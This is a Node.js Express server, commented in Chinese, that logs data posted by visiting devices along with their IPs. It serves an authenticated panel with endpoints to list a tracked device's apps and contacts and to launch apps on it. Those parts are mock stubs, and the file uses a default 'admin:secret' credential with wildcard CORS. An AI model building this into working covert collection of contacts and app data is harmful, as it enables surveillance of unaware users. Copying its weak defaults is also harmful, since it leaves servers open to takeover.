const express = require('express');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
require('dotenv').config();

class Server {
    constructor() {
        this.app = express();
        this.port = process.env.PORT || 3000;
        this.setupMiddleware();
        this.setupRoutes();
        this.setupErrorHandling();
        this.visitors = new Map();
        this.deviceData = new Map();
    }

    setupMiddleware() {
        // 基础安全设置
        this.app.use(helmet({
            contentSecurityPolicy: false
        }));
        
        // CORS设置
        this.app.use(cors({
            origin: process.env.ALLOWED_ORIGINS || '*'
        }));

        // 请求限制
        const limiter = rateLimit({
            windowMs: 15 * 60 * 1000,
            max: 100
        });
        this.app.use(limiter);

        // 日志记录
        this.app.use(morgan('combined'));

        // 请求体解析
        this.app.use(express.json());
        this.app.use(express.urlencoded({ extended: true }));

        // 静态文件服务
        this.app.use(express.static(path.join(__dirname, '../public')));
    }

    setupRoutes() {
        // 主页路由
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, '../public/index.html'));
        });

        // 监控页面 - 需要密码访问
        this.app.get('/monitor', (req, res, next) => {
            const auth = req.headers.authorization;
            if (!auth || auth !== `Basic ${Buffer.from(process.env.ADMIN_AUTH || 'admin:secret').toString('base64')}`) {
                res.set('WWW-Authenticate', 'Basic realm="Monitor Access"');
                return res.status(401).send('Authentication required');
            }
            res.sendFile(path.join(__dirname, '../public/monitor.html'));
        });

        // 追踪API
        this.app.post('/api/track', async (req, res) => {
            const clientIP = req.ip || req.connection.remoteAddress;
            const data = {
                ...req.body,
                ip: clientIP,
                timestamp: new Date().toISOString()
            };
            
            // 保存设备数据
            this.deviceData.set(clientIP, data);
            await this.saveDeviceData(data);
            
            res.status(200).send({ status: 'ok' });
        });

        // 监控API
        this.app.get('/api/monitor', this.authenticate.bind(this), async (req, res) => {
            const devices = Array.from(this.deviceData.values());
            res.json({
                devices,
                system: {
                    platform: process.platform,
                    nodeVersion: process.version,
                    memory: process.memoryUsage(),
                    cpu: process.cpuUsage()
                }
            });
        });

        // 获取应用列表
        this.app.get('/api/apps', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            // 这里应该是从设备获取的实际应用列表
            const mockApps = [
                { id: 'com.whatsapp', name: 'WhatsApp' },
                { id: 'com.facebook', name: 'Facebook' },
                { id: 'com.instagram', name: 'Instagram' },
                { id: 'com.twitter', name: 'Twitter' },
                { id: 'com.snapchat', name: 'Snapchat' }
            ];
            
            res.json(mockApps);
        });

        // 获取通讯录
        this.app.get('/api/contacts', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            // 这里应该是从设备获取的实际通讯录
            const mockContacts = [
                { name: '张三', phone: '13800138000' },
                { name: '李四', phone: '13900139000' },
                { name: '王五', phone: '13700137000' }
            ];
            
            res.json(mockContacts);
        });

        // 启动应用
        this.app.post('/api/launch-app', this.authenticate.bind(this), async (req, res) => {
            const { appId } = req.body;
            const clientIP = req.query.ip;
            
            // 这里应该是实际启动应用的逻辑
            this.log(`尝试启动应用: ${appId} on device: ${clientIP}`);
            
            res.json({ status: 'success', message: `已尝试启动应用: ${appId}` });
        });
    }

    authenticate(req, res, next) {
        const auth = req.headers.authorization;
        if (!auth || auth !== `Basic ${Buffer.from(process.env.ADMIN_AUTH || 'admin:secret').toString('base64')}`) {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        next();
    }

    async saveDeviceData(data) {
        try {
            const logDir = path.join(__dirname, '../logs');
            await fs.mkdir(logDir, { recursive: true });
            
            const logFile = path.join(logDir, `devices_${new Date().toISOString().split('T')[0]}.json`);
            let logs = [];
            
            try {
                const content = await fs.readFile(logFile, 'utf8');
                logs = JSON.parse(content);
            } catch (error) {
                // 文件不存在或解析错误，使用空数组
            }
            
            logs.push(data);
            await fs.writeFile(logFile, JSON.stringify(logs, null, 2));
        } catch (error) {
            console.error('Error saving device data:', error);
        }
    }

    log(message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] ${message}`);
    }

    setupErrorHandling() {
        this.app.use((err, req, res, next) => {
            console.error(err.stack);
            res.status(500).json({
                error: 'Internal Server Error',
                message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
            });
        });
    }

    start() {
        this.app.listen(this.port, () => {
            console.log(`Server running on port ${this.port}`);
        });
    }
}

// 启动服务器
const server = new Server();
server.start(); 
